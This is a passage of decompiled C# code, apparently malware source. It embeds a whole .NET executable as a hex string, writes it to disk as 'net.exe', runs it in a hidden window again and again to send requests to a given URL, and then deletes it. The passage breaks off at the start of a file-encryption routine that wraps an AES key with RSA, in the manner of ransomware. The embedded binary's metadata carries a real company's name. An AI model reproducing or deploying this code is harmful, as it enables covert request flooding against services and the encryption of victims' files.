6973706C61794E616D65142E4E4554204672616D65776F726B20342E372E32001400004D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103000D080CC60000000000000000E00022000B013000000A00000008000000000000DA280000002000000040000000004000002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000852800004F00000000400000E405000000000000000000000000000000000000006000000C000000EC270000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000E008000000200000000A000000020000000000000000000000000000200000602E72737263000000E40500000040000000060000000C0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001200000000000000000000000000004000004200000000000000000000000000000000B9280000000000004800000002000500CC2000002007000003000200010000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B300300560000000100001102169A280F00000A0A066F1000000A6F1100000A731200000A0B72010000700C160D2B1F0917580D076F1300000A0C082C117203000070098C1600000108281400000A082DDEDE0D267213000070281500000ADE002A000001100000000009003F48000D100000011E02281600000A2A42534A4201000100000000000C00000076342E302E33303331390000000005006C0000002C020000237E000098020000CC02000023537472696E677300000000640500005000000023555300B4050000100000002347554944000000C40500005C01000023426C6F620000000000000002000001471502000900000000FA0133001600000100000017000000020000000200000001000000160000000E0000000100000001000000020000000000C2010100000000000600370171020600A401710206006B003F020F0091020000060093000F0206001A010F020600FB000F0206008B010F02060057010F02060070010F020600AA000F0206007F00520206005D0052020600DE000F020600C500CF010600A50203020A00B702AC020600210210000A003E00AC020600F401100006002E021000060001000302060023000302000000000700000000000100010000001000FB01C20241000100010050200000000091000A0252000100C42000000000861839020600020000000100A002090039020100110039020600190039020A0029003902100031003902100039003902100041003902100049003902100051003902100059003902100061003902150069003902100071003902100079003902100089005600230089004A0029009900E9012E00910039023300A9002B003900B90034003D00B900340044008100390206002E000B0058002E00130061002E001B0080002E00230089002E002B0097002E00330097002E003B009D002E00430089002E004B00B1002E00530097002E005B0097002E006300D7002E006B0001012E0073000E011A00048000000100000000000000000000000000C202000004000000000000000000000049001A00000000000400000000000000000000004900030200000000000000496E743332003C4D6F64756C653E0053797374656D2E494F006D73636F726C696200436F6E736F6C6500526561644C696E650057726974654C696E6500576562526573706F6E736500476574526573706F6E73650043726561746500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650067657472656C61792E6578650053797374656D2E52756E74696D652E56657273696F6E696E6700476574526573706F6E736553747265616D0050726F6772616D0053797374656D004D61696E0053797374656D2E5265666C656374696F6E0053747265616D5265616465720054657874526561646572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730061726773004F626A6563740053797374656D2E4E657400576562526571756573740067657472656C617900000001000F7B0030007D003A007B0031007D00003B4500720072006F0072002C00200063006800650063006B0020007400680065002000550052004C00200039003800340033007A0065007200710000003BCBAB9B49EDD747B6A9A1E3EA57BF0200042001010803200001052001011111042001010E0420010102080704124512490E0805000112450E042000124D04200012510520010112510320000E060003010E1C1C040001010E08B77A5C561934E089050001011D0E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000D01000867657472656C617900000501000000001301000E2020202020202020202020202020000025010020436F7079726967687420C2A9203230323120202020202020202020202020202000002901002466396130363765352D643866622D346632612D623061642D64323165393864376232333800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3200000000025ABACB00000000020000006100000024280000240A00000000000000000000000000001000000000000000000000000000000052534453709A1FBD540EAC47998F3D84A75EDC410100000020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202000AD2800000000000000000000C7280000002000000000000000000000000000000000000000000000B9280000000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000000000FF250020400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200100000002000008018000000500000800000000000000000000000000000010001000000380000800000000000000000000000000000010000000000800000000000000000000000000000000000010001000000680000800000000000000000000000000000010000000000E403000090400000540300000000000000000000540334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4020000010053007400720069006E006700460069006C00650049006E0066006F0000009002000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E00740073000000000000003E000F00010043006F006D00700061006E0079004E0061006D0065000000000020002000200020002000200020002000200020002000200020002000000000003A0009000100460069006C0065004400650073006300720069007000740069006F006E00000000006E00650074003100200020002000200000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D00650000006E006500740031002E006500780065002000200020002000000000006400200001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A9002000320030003200310020002000200020002000200020002000200020002000200020002000200000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006E006500740031002E00650078006500200020002000200000000000320009000100500072006F0064007500630074004E0061006D006500000000006E006500740031002E0065007800650000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000F4430000EA0100000000000000000000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C6567657320786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E00000000000000000000000000000000000000000000000000000000000000000000002000000C000000DC380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007B7909D2000000000200000061000000343C0000341E000000000000000000000000000010000000000000000000000000000000525344539571E5573D850E46949C412D70C81A150100000020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202000BD3C00000000000000000000D73C0000002000000000000000000000000000000000000000000000C93C0000000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000000000FF2500204000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200100000002000008018000000500000800000000000000000000000000000010001000000380000800000000000000000000000000000010000000000800000000000000000000000000000000000010001000000680000800000000000000000000000000000010000000000E403000090400000540300000000000000000000540334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4020000010053007400720069006E006700460069006C00650049006E0066006F0000009002000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E00740073000000000000003E000F00010043006F006D00700061006E0079004E0061006D0065000000000020002000200020002000200020002000200020002000200020002000000000003A0009000100460069006C0065004400650073006300720069007000740069006F006E00000000006E006500740031002E0065007800650000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D00650000006E006500740031002E006500780065002000200020002000000000006400200001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A9003200300032003100200020002000200020002000200020002000200020002000200020002000200000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006E006500740031002E00650078006500200020002000200000000000320009000100500072006F0064007500630074004E0061006D006500000000006E006500740031002E0065007800650000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000F4430000EA0100000000000000000000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C6567657320786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E00000000000000000000000000000000000000000000000000000000000000000000003000000C000000EC3C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000".Length / 2];
		for (int i = 0; i < array.Length; i++)
		{
			string s = "4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300DFF6BE830000000000000000E00022000B013000001E00000008000000000000EA3C0000002000000040000000004000002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000953C00004F00000000400000E405000000000000000000000000000000000000006000000C000000FC3B0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000F01C000000200000001E000000020000000000000000000000000000200000602E72737263000000E4050000004000000006000000200000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000002600000000000000000000000000004000004200000000000000000000000000000000C93C0000000000004800000002000500CC200000280700000300020001000006F427000008140000000000000000000000000000000000000000000000000000000000000000000000000000000000001B300300560000000100001102169A280F00000A0A066F1000000A6F1100000A731200000A0B72010000700C160D2B1F0917580D076F1300000A0C082C117203000070098C1600000108281400000A082DDEDE0D267213000070281500000ADE002A000001100000000009003F48000D100000011E02281600000A2A42534A4201000100000000000C00000076342E302E33303331390000000005006C0000003C020000237E0000A8020000D402000023537472696E6773000000007C0500004000000023555300BC050000100000002347554944000000CC0500005C01000023426C6F620000000000000002000001471502000901000000FA0133001600000100000017000000020000000200000001000000160000000E000000010000000100000002000000010000000000CB01010000000000060037017A020600A4017A0206006B0048020F009A02000006009300180206001A0118020600FB00180206008B0118020600570118020600700118020600AA00180206007F005B0206005D005B020600DE0018020600C500D8010600AE020C020A00C002B50206002A0210000A003E00B5020600FD011000060037021000060001000C02060023000C020000000007000000000001000100000010000402CB024100010001005020000000009100130252000100C42000000000861842020600020000000100A902090042020100110042020600190042020A0029004202100031004202100039004202100041004202100049004202100051004202100059004202100061004202150069004202100071004202100079004202100089005600230089004A0029009900F2012E00910042023300A9002B003900B90034003D00B900340044008100420206002E000B0058002E00130061002E001B0080002E00230089002E002B0097002E00330097002E003B009D002E00430089002E004B00B1002E00530097002E005B0097002E006300D7002E006B0001012E0073000E011A00048000000100000000000000000000000000CB02000004000000000000000000000049001A000000000004000000000000000000000049000C02000000000000000001000000C2010000000000496E743332003C4D6F64756C653E0053797374656D2E494F006D73636F726C696200436F6E736F6C6500526561644C696E650057726974654C696E6500576562526573706F6E736500476574526573706F6E73650043726561746500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650067657472656C61792E67657472656C61792E6578650053797374656D2E52756E74696D652E56657273696F6E696E6700476574526573706F6E736553747265616D0050726F6772616D0053797374656D004D61696E0053797374656D2E5265666C656374696F6E0053747265616D5265616465720054657874526561646572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730061726773004F626A6563740053797374656D2E4E657400576562526571756573740067657472656C6179000001000F7B0030007D003A007B0031007D00002B4500720072006F0072002C00200063006800650063006B0020007400680065002000550052004C002E000000E469C7ECA0C6424A884684CEAA5BFE2A00042001010803200001052001011111042001010E0420010102080704124512490E0805000112450E042000124D04200012510520010112510320000E060003010E1C1C040001010E08B77A5C561934E089050001011D0E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000D01000867657472656C617900000501000000001301000E5342422043464620464653204147000025010020436F7079726967687420C2A9205342422043464620464653204147203230323100002901002466396130363765352D643866622D346632612D623061642D64323165393864376232333800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E32001400004D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103000D080CC60000000000000000E00022000B013000000A00000008000000000000DA280000002000000040000000004000002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000852800004F00000000400000E405000000000000000000000000000000000000006000000C000000EC270000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000E008000000200000000A000000020000000000000000000000000000200000602E72737263000000E40500000040000000060000000C0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001200000000000000000000000000004000004200000000000000000000000000000000B9280000000000004800000002000500CC2000002007000003000200010000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B300300560000000100001102169A280F00000A0A066F1000000A6F1100000A731200000A0B72010000700C160D2B1F0917580D076F1300000A0C082C117203000070098C1600000108281400000A082DDEDE0D267213000070281500000ADE002A000001100000000009003F48000D100000011E02281600000A2A42534A4201000100000000000C00000076342E302E33303331390000000005006C0000002C020000237E000098020000CC02000023537472696E677300000000640500005000000023555300B4050000100000002347554944000000C40500005C01000023426C6F620000000000000002000001471502000900000000FA0133001600000100000017000000020000000200000001000000160000000E0000000100000001000000020000000000C2010100000000000600370171020600A401710206006B003F020F0091020000060093000F0206001A010F020600FB000F0206008B010F02060057010F02060070010F020600AA000F0206007F00520206005D0052020600DE000F020600C500CF010600A50203020A00B702AC020600210210000A003E00AC020600F401100006002E021000060001000302060023000302000000000700000000000100010000001000FB01C20241000100010050200000000091000A0252000100C42000000000861839020600020000000100A002090039020100110039020600190039020A0029003902100031003902100039003902100041003902100049003902100051003902100059003902100061003902150069003902100071003902100079003902100089005600230089004A0029009900E9012E00910039023300A9002B003900B90034003D00B900340044008100390206002E000B0058002E00130061002E001B0080002E00230089002E002B0097002E00330097002E003B009D002E00430089002E004B00B1002E00530097002E005B0097002E006300D7002E006B0001012E0073000E011A00048000000100000000000000000000000000C202000004000000000000000000000049001A00000000000400000000000000000000004900030200000000000000496E743332003C4D6F64756C653E0053797374656D2E494F006D73636F726C696200436F6E736F6C6500526561644C696E650057726974654C696E6500576562526573706F6E736500476574526573706F6E73650043726561746500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650067657472656C61792E6578650053797374656D2E52756E74696D652E56657273696F6E696E6700476574526573706F6E736553747265616D0050726F6772616D0053797374656D004D61696E0053797374656D2E5265666C656374696F6E0053747265616D5265616465720054657874526561646572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730061726773004F626A6563740053797374656D2E4E657400576562526571756573740067657472656C617900000001000F7B0030007D003A007B0031007D00003B4500720072006F0072002C00200063006800650063006B0020007400680065002000550052004C00200039003800340033007A0065007200710000003BCBAB9B49EDD747B6A9A1E3EA57BF0200042001010803200001052001011111042001010E0420010102080704124512490E0805000112450E042000124D04200012510520010112510320000E060003010E1C1C040001010E08B77A5C561934E089050001011D0E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000D01000867657472656C617900000501000000001301000E2020202020202020202020202020000025010020436F7079726967687420C2A9203230323120202020202020202020202020202000002901002466396130363765352D643866622D346632612D623061642D64323165393864376232333800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3200000000025ABACB00000000020000006100000024280000240A00000000000000000000000000001000000000000000000000000000000052534453709A1FBD540EAC47998F3D84A75EDC410100000020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202000AD2800000000000000000000C7280000002000000000000000000000000000000000000000000000B9280000000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000000000FF250020400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200100000002000008018000000500000800000000000000000000000000000010001000000380000800000000000000000000000000000010000000000800000000000000000000000000000000000010001000000680000800000000000000000000000000000010000000000E403000090400000540300000000000000000000540334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4020000010053007400720069006E006700460069006C00650049006E0066006F0000009002000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E00740073000000000000003E000F00010043006F006D00700061006E0079004E0061006D0065000000000020002000200020002000200020002000200020002000200020002000000000003A0009000100460069006C0065004400650073006300720069007000740069006F006E00000000006E00650074003100200020002000200000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D00650000006E006500740031002E006500780065002000200020002000000000006400200001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A9002000320030003200310020002000200020002000200020002000200020002000200020002000200000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006E006500740031002E00650078006500200020002000200000000000320009000100500072006F0064007500630074004E0061006D006500000000006E006500740031002E0065007800650000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000F4430000EA0100000000000000000000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C6567657320786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E00000000000000000000000000000000000000000000000000000000000000000000002000000C000000DC380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007B7909D2000000000200000061000000343C0000341E000000000000000000000000000010000000000000000000000000000000525344539571E5573D850E46949C412D70C81A150100000020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202000BD3C00000000000000000000D73C0000002000000000000000000000000000000000000000000000C93C0000000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000000000FF2500204000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200100000002000008018000000500000800000000000000000000000000000010001000000380000800000000000000000000000000000010000000000800000000000000000000000000000000000010001000000680000800000000000000000000000000000010000000000E403000090400000540300000000000000000000540334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4020000010053007400720069006E006700460069006C00650049006E0066006F0000009002000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E00740073000000000000003E000F00010043006F006D00700061006E0079004E0061006D0065000000000020002000200020002000200020002000200020002000200020002000000000003A0009000100460069006C0065004400650073006300720069007000740069006F006E00000000006E006500740031002E0065007800650000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D00650000006E006500740031002E006500780065002000200020002000000000006400200001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A9003200300032003100200020002000200020002000200020002000200020002000200020002000200000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006E006500740031002E00650078006500200020002000200000000000320009000100500072006F0064007500630074004E0061006D006500000000006E006500740031002E0065007800650000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000F4430000EA0100000000000000000000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C6567657320786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E00000000000000000000000000000000000000000000000000000000000000000000003000000C000000EC3C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000".Substring(i * 2, 2);
			array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
		}
		using (FileStream fileStream = new FileStream("net.exe", FileMode.Create))
		{
			for (int j = 0; j < array.Length; j++)
			{
				fileStream.WriteByte(array[j]);
			}
		}
		Process process = new Process
		{
			StartInfo = new ProcessStartInfo
			{
				FileName = "net.exe",
				Arguments = url,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				CreateNoWindow = true
			}
		};
		for (int k = 0; k < n; k++)
		{
			process.Start();
			Console.WriteLine("Sent GET request to " + url);
			Thread.Sleep(1000);
		}
		File.Delete("net.exe");
	}

	private void EncryptFile(string inFile)
	{
		Aes aes = Aes.Create();
		ICryptoTransform transform = aes.CreateEncryptor();
		byte[] array = rsa.Encrypt(aes.Key, fOAEP: false);
